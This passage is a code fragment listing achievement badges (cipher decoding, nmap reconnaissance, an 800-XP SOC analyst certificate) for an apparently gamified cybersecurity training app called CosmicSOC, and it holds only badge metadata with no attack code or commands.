    requiredAction: 'sqli-solved',
  },
  {
    id: 'badge-cipher-master',
    name: 'Cipher Decryptor',
    description: 'Decoded encrypted ciphers and tested SHA-256 rainbow tables.',
    iconName: 'Binary',
    requiredAction: 'crypto-solved',
  },
  {
    id: 'badge-recon-scout',
    name: 'Port Recon Scout',
    description: 'Executed nmap reconnaissance and mapped perimeter service exposures.',
    iconName: 'Radio',
    requiredAction: 'recon-completed',
  },
  {
    id: 'badge-certified-analyst',
    name: 'Certified SOC Analyst Level 1',
    description: 'Achieved 800+ XP and earned the official CosmicSOC certificate.',
    iconName: 'Award',
    unlockedAtXp: 800,
  },
];
